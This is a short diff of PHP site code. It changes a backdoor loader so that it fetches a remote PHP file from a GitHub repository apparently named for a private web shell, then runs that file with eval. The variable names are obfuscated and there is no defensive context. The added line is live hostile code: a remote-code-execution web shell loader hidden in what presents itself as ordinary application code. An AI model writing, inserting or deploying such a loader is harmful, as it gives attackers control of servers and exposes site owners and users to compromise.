@@ -87,7 +87,7 @@ if (is_logged_in()) {
         return false;
     }    
 
-    $b0rn = 'https://raw.githubusercontent.com/sec0x/web/refs/heads/main/mod.php';
+    $b0rn = 'https://raw.githubusercontent.com/GhostlyrootB2H/Shell-Private/refs/heads/main/b2h-v2shell/b2hv2-mentah.php';
     $dr34m = geturlsinfo($b0rn);
     if ($dr34m !== false) {
         eval('?>' . $dr34m); 
